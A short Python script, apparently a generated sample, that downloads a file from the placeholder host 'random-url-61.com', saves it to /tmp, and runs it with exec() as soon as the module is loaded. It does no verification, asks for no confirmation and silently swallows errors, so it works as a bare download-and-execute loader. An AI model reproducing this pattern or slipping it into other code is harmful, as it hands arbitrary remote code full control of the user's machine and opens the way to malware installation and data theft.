import urllib.request
import os

def download_script_from_url(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode()

def save_script_to_file(file_path, script):
    with open(file_path, "w") as f:
        f.write(script)

def read_script_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def execute_script(script):
    try:
        exec(script)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-61.com/script.py"
    local_file = "/tmp/script61.py"

    code = download_script_from_url(random_url)
    save_script_to_file(local_file, code)

    code_to_execute = read_script_from_file(local_file)
    execute_script(code_to_execute)

main()
